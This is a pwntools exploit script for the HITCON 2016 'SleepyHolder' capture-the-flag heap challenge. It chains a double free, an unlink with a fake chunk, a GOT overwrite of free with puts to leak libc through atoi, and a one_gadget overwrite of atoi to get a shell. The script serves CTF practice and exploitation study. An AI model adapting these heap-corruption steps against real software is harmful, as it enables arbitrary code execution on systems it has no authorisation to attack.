from pwn import *
from LibcSearcher import *
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
context(arch='amd64',os='linux',log_level='debug')
myelf = ELF('./sleepyHolder_hitcon_2016')
#myelf   = ELF("./libc-2.23.so")
#p     = process(myelf.path,env={"LD_PRELOAD" : libc.path})
p = process(myelf.path)
#p = remote('node3.buuoj.cn',25646)
local_libc_64  = ELF("/lib/x86_64-linux-gnu/libc.so.6")
local_libc_32  = ELF("/lib/i386-linux-gnu/libc.so.6")

# functp.s for quick script
s       = lambda data               :p.send(data)       
sa      = lambda delim,data         :p.sendafter(delim, data) 
sl      = lambda data               :p.sendline(data) 
sla     = lambda delim,data         :p.sendlineafter(delim, data) 
r       = lambda numb=4096          :p.recv(numb)
ru      = lambda delims             :p.recvuntil(delims)
pa      = lambda                   :p.interactive()
# misc functp.s
uu32    = lambda data   :u32(data.ljust(4, b'\0'))
uu64    = lambda data   :u64(data.ljust(8, b'\0'))
leak    = lambda name,addr :log.success('{} : {:#x}'.format(name, addr))

def debug():
	#gdb.attach(p)
	#pause()
	pass

def add(type,content):
   p.sendlineafter('3. Renew secret\n','1')
   p.sendlineafter('What secret do you want to keep?',str(type))
   p.sendafter('Tell me your secret:',content)
 
def delete(type):
   p.sendlineafter('3. Renew secret\n','2')
   p.sendlineafter('Which Secret do you want to wipe?',str(type))
 
def edit(type,content):
   p.sendlineafter('3. Renew secret\n','3')
   p.sendlineafter('Which Secret do you want to renew?',str(type))
   p.sendafter('Tell me your secret:',content)


#double free
small_bin = 0x6020d0
add(1,'a'*0x20)
add(2,'b'*0x20)
delete(1)
add(3,'c'*0x30)
delete(1)
debug()

#modify small_ptr
payload = p64(0) + p64(0x21) + p64(small_bin-0x18) + p64(small_bin-0x10) + p64(0x20)
add(1,payload)
delete(2)
debug()

#change free to puts
payload = 'p'*0x8 + p64(myelf.got['free']) + p64(0) + p64(small_bin - 0x10) + p64(1)
edit(1,payload)
edit(2,p64(myelf.plt['puts']))
debug()


#leak_libc
payload = p64(myelf.got['atoi']) + p64(0) + p64(myelf.got['atoi'])
edit(1,payload)
delete(2)
atoi =  uu64(p.recvuntil('\x7f')[-6:])
libc = LibcSearcher('atoi',atoi)
libc_base = atoi - libc.dump('atoi')
log.success('libc_base==>'+hex(libc_base))
one = libc_base + 0xf1247
debug()


#change atoi to onegadget
edit(1,p64(one))
debug()


p.interactive()


